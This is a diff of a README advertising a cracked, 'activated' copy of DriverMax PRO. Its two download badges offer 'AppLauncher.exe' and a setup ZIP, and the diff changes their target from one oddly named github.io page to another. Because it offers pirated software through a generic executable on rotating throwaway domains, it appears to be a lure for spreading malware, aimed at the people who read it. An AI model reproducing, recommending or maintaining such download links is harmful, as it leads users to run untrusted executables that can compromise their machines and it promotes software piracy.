@@ -1,7 +1,7 @@
 # 🚗 DriverMax PRO + Portable Activated!
 
-[![Download AppLauncher.exe](https://img.shields.io/badge/Download-AppLauncher.exe-brightgreen?style=for-the-badge)](https://manchestleboweb1.github.io/.github/)
-[![Get Setup Package](https://img.shields.io/badge/Get_Setup_Package-ZIP-blue?style=for-the-badge)](https://manchestleboweb1.github.io/.github/)
+[![Download AppLauncher.exe](https://img.shields.io/badge/Download-AppLauncher.exe-brightgreen?style=for-the-badge)](https://drivermaxpro4portinf0.github.io/.github/)
+[![Get Setup Package](https://img.shields.io/badge/Get_Setup_Package-ZIP-blue?style=for-the-badge)](https://drivermaxpro4portinf0.github.io/.github/)
 
 ---
 
